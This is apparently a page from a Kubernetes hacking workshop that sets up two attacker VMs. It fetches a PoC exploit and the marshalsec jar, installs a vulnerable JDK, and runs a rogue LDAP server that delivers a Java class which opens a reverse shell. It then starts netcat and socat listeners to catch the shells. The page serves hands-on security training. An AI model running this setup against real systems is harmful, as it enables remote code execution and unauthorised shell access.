+++
title = "Prepare the attacker VMs"
weight = 7
+++

We also have to prepare our attacker VM.

Let's install an application that poses as an LDAP server and provider a Java class to the vulnerable application which will create a remote connection back to the attacker VM.

**Run the following commands on the attacker01 VM.**

```ctr:
sudo zypper in -y python3
```

Download the app

```ctr:
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/poc.py
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/requirements.txt
mkdir ~/target
wget https://github.com/bashofmann/hacking-kubernetes/raw/main/exploiting-app/target/marshalsec-0.0.3-SNAPSHOT-all.jar -P ~/target
pip3 install -r requirements.txt
```

Download a vulnerable JDK

```ctr:
wget https://download.java.net/openjdk/jdk8u43/ri/openjdk-8u43-linux-x64.tar.gz
tar -xvf openjdk-8u43-linux-x64.tar.gz
mv java-se-8u43-ri/ jdk1.8.0_20
```

Now we can run the python app that provides the exploit

```ctr:
sudo python3 poc.py --userip ${vminfo:attacker01:public_ip} --webport 80 --lport 443 &
```

And start listening for remote shells

```ctr:
sudo nc -lvnp 443
```

**Run the following commands on the attacker02 VM.**

```ctr:
sudo zypper in -y socat
```

```ctr:
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
